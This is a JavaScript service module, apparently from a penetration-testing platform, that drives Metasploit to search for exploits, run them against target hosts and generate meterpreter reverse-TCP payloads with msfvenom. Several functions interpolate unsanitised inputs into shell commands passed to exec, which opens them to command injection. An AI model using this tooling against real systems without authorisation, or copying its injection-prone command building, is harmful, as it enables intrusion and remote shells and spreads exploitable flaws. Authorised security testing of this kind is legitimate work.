/**
 * Exploit Service - Manages exploit modules and execution
 * Integrates with Metasploit, ExploitDB, and custom exploits
 */

const axios = require('axios');
const { exec, spawn } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);
const ExploitModule = require('../models/ExploitModule.model');
const logger = require('../../../../../shared/utils/logger');

class ExploitService {
  constructor() {
    this.msf = {
      host: process.env.PENTESTAI_METASPLOIT_HOST || 'localhost',
      port: process.env.PENTESTAI_METASPLOIT_PORT || 55553,
      user: process.env.PENTESTAI_METASPLOIT_USER || 'msf',
      password: process.env.PENTESTAI_METASPLOIT_PASSWORD || ''
    };
    this.exploitDbKey = process.env.PENTESTAI_EXPLOITDB_API_KEY;
    this.msfToken = null;
  }

  /**
   * Initialize Metasploit RPC connection
   */
  async connectMetasploit() {
    if (!this.msf.password) {
      logger.warn('Metasploit password not configured');
      return null;
    }

    try {
      const response = await axios.post(
        `http://${this.msf.host}:${this.msf.port}/api/`,
        {
          method: 'auth.login',
          username: this.msf.user,
          password: this.msf.password
        }
      );

      if (response.data.result === 'success') {
        this.msfToken = response.data.token;
        logger.info('Connected to Metasploit RPC');
        return this.msfToken;
      }
    } catch (error) {
      logger.error('Metasploit connection failed:', error.message);
    }
    return null;
  }

  /**
   * Search for exploits by CVE
   */
  async searchByCVE(cveId) {
    const results = {
      local: [],
      exploitdb: [],
      metasploit: []
    };

    try {
      // Search local database first
      results.local = await ExploitModule.findByCVE(cveId);

      // Search ExploitDB
      if (this.exploitDbKey) {
        try {
          const edbResults = await this.searchExploitDB(cveId);
          results.exploitdb = edbResults;
        } catch (e) {
          logger.warn('ExploitDB search failed:', e.message);
        }
      }

      // Search Metasploit if connected
      if (this.msfToken) {
        try {
          const msfResults = await this.searchMetasploit(cveId);
          results.metasploit = msfResults;
        } catch (e) {
          logger.warn('Metasploit search failed:', e.message);
        }
      }
    } catch (error) {
      logger.error('CVE exploit search error:', error);
    }

    return results;
  }

  /**
   * Search ExploitDB
   */
  async searchExploitDB(query) {
    try {
      // Using searchsploit locally if available
      const { stdout } = await execPromise(`searchsploit -j "${query}" 2>/dev/null || echo "[]"`);
      const results = JSON.parse(stdout);
      
      return (results.RESULTS_EXPLOIT || []).map(exp => ({
        id: exp.EDB_ID,
        title: exp.Title,
        path: exp.Path,
        platform: exp.Platform,
        type: exp.Type,
        date: exp.Date
      }));
    } catch (error) {
      // Fallback: try local database
      return ExploitModule.find({
        'source.type': 'exploitdb',
        $or: [
          { name: new RegExp(query, 'i') },
          { 'vulnerability.cveIds': query }
        ]
      }).limit(20).lean();
    }
  }

  /**
   * Search Metasploit modules
   */
  async searchMetasploit(query) {
    if (!this.msfToken) {
      await this.connectMetasploit();
    }

    if (!this.msfToken) {
      return [];
    }

    try {
      const response = await axios.post(
        `http://${this.msf.host}:${this.msf.port}/api/`,
        {
          method: 'module.search',
          token: this.msfToken,
          match: query
        }
      );

      return response.data.modules || [];
    } catch (error) {
      logger.error('Metasploit search error:', error.message);
      return [];
    }
  }

  /**
   * Get exploit module details
   */
  async getModuleInfo(moduleType, modulePath) {
    // Check local database first
    const localModule = await ExploitModule.findOne({
      'source.path': modulePath
    });

    if (localModule) {
      return localModule;
    }

    // Fetch from Metasploit
    if (this.msfToken) {
      try {
        const response = await axios.post(
          `http://${this.msf.host}:${this.msf.port}/api/`,
          {
            method: 'module.info',
            token: this.msfToken,
            type: moduleType,
            name: modulePath
          }
        );
        return response.data;
      } catch (error) {
        logger.error('Get module info error:', error.message);
      }
    }

    return null;
  }

  /**
   * Execute an exploit module
   */
  async executeExploit(options) {
    const {
      moduleType = 'exploit',
      modulePath,
      target,
      payload,
      moduleOptions = {},
      timeout = parseInt(process.env.PENTESTAI_EXPLOIT_TIMEOUT) || 300
    } = options;

    const startTime = Date.now();
    const result = {
      success: false,
      output: '',
      sessionId: null,
      error: null,
      duration: 0
    };

    try {
      // Record module usage
      const module = await ExploitModule.findOne({ 'source.path': modulePath });

      if (this.msfToken) {
        // Execute via Metasploit RPC
        result.output = await this.executeMsfModule({
          moduleType,
          modulePath,
          target,
          payload,
          moduleOptions,
          timeout
        });
        result.success = !result.output.includes('Exploit failed') && 
                          !result.output.includes('No session was created');
      } else {
        // Fallback: Use msfconsole command
        result.output = await this.executeMsfConsole({
          moduleType,
          modulePath,
          target,
          payload,
          moduleOptions,
          timeout
        });
        result.success = result.output.includes('session') || 
                          result.output.includes('Meterpreter');
      }

      // Update module statistics
      if (module) {
        const execTime = (Date.now() - startTime) / 1000;
        await module.recordUsage(result.success, execTime);
      }

    } catch (error) {
      result.error = error.message;
      logger.error('Exploit execution error:', error);
    }

    result.duration = Date.now() - startTime;
    return result;
  }

  /**
   * Execute via Metasploit RPC
   */
  async executeMsfModule(options) {
    const { moduleType, modulePath, target, payload, moduleOptions, timeout } = options;

    // Create console
    const consoleResponse = await axios.post(
      `http://${this.msf.host}:${this.msf.port}/api/`,
      { method: 'console.create', token: this.msfToken }
    );
    const consoleId = consoleResponse.data.id;

    try {
      // Build command
      let cmd = `use ${moduleType}/${modulePath}\n`;
      cmd += `set RHOSTS ${target.host}\n`;
      if (target.port) cmd += `set RPORT ${target.port}\n`;
      if (payload) cmd += `set PAYLOAD ${payload}\n`;
      
      // Set additional options
      for (const [key, value] of Object.entries(moduleOptions)) {
        cmd += `set ${key} ${value}\n`;
      }
      
      cmd += 'exploit -z\n';

      // Execute command
      await axios.post(
        `http://${this.msf.host}:${this.msf.port}/api/`,
        {
          method: 'console.write',
          token: this.msfToken,
          id: consoleId,
          data: cmd
        }
      );

      // Wait and read output
      let output = '';
      const endTime = Date.now() + (timeout * 1000);

      while (Date.now() < endTime) {
        await new Promise(r => setTimeout(r, 1000));

        const readResponse = await axios.post(
          `http://${this.msf.host}:${this.msf.port}/api/`,
          {
            method: 'console.read',
            token: this.msfToken,
            id: consoleId
          }
        );

        output += readResponse.data.data || '';

        if (readResponse.data.busy === false && output.includes('exploit(')) {
          break;
        }
      }

      return output;
    } finally {
      // Destroy console
      await axios.post(
        `http://${this.msf.host}:${this.msf.port}/api/`,
        { method: 'console.destroy', token: this.msfToken, id: consoleId }
      ).catch(() => {});
    }
  }

  /**
   * Execute via msfconsole command line (fallback)
   */
  async executeMsfConsole(options) {
    const { moduleType, modulePath, target, payload, moduleOptions, timeout } = options;

    return new Promise((resolve, reject) => {
      let output = '';
      let cmd = `use ${moduleType}/${modulePath}; set RHOSTS ${target.host};`;
      if (target.port) cmd += ` set RPORT ${target.port};`;
      if (payload) cmd += ` set PAYLOAD ${payload};`;
      
      for (const [key, value] of Object.entries(moduleOptions)) {
        cmd += ` set ${key} ${value};`;
      }
      cmd += ' exploit -z; exit;';

      const msf = spawn('msfconsole', ['-q', '-x', cmd], {
        timeout: timeout * 1000
      });

      msf.stdout.on('data', data => { output += data.toString(); });
      msf.stderr.on('data', data => { output += data.toString(); });

      msf.on('close', code => {
        resolve(output);
      });

      msf.on('error', error => {
        reject(error);
      });
    });
  }

  /**
   * Generate payload
   */
  async generatePayload(options) {
    const {
      payload = 'linux/x64/meterpreter/reverse_tcp',
      format = 'elf',
      lhost,
      lport = 4444,
      encoder,
      iterations = 1,
      outputPath
    } = options;

    try {
      let cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format}`;
      
      if (encoder) {
        cmd += ` -e ${encoder} -i ${iterations}`;
      }
      
      if (outputPath) {
        cmd += ` -o ${outputPath}`;
      }

      const { stdout, stderr } = await execPromise(cmd, { maxBuffer: 10 * 1024 * 1024 });
      
      return {
        success: true,
        output: outputPath || stdout,
        format
      };
    } catch (error) {
      logger.error('Payload generation error:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  /**
   * Get recommended exploits for a target based on scan results
   */
  async getRecommendedExploits(targetInfo) {
    const { os, services, vulnerabilities } = targetInfo;
    const recommendations = [];

    // Match by CVE first
    if (vulnerabilities && vulnerabilities.length > 0) {
      for (const vuln of vulnerabilities.slice(0, 10)) {
        if (vuln.cveIds) {
          for (const cveId of vuln.cveIds) {
            const exploits = await ExploitModule.findByCVE(cveId);
            if (exploits.length > 0) {
              recommendations.push({
                type: 'cve_match',
                cveId,
                vulnerability: vuln.name,
                exploits: exploits.slice(0, 3),
                confidence: 'high'
              });
            }
          }
        }
      }
    }

    // Match by service
    if (services && services.length > 0) {
      for (const svc of services) {
        const platform = os?.toLowerCase().includes('windows') ? 'windows' : 'linux';
        const exploits = await ExploitModule.findForTarget(platform, svc.service, svc.version);
        
        if (exploits.length > 0) {
          recommendations.push({
            type: 'service_match',
            service: svc.service,
            version: svc.version,
            port: svc.port,
            exploits: exploits.slice(0, 3),
            confidence: 'medium'
          });
        }
      }
    }

    return recommendations;
  }
}

module.exports = new ExploitService();
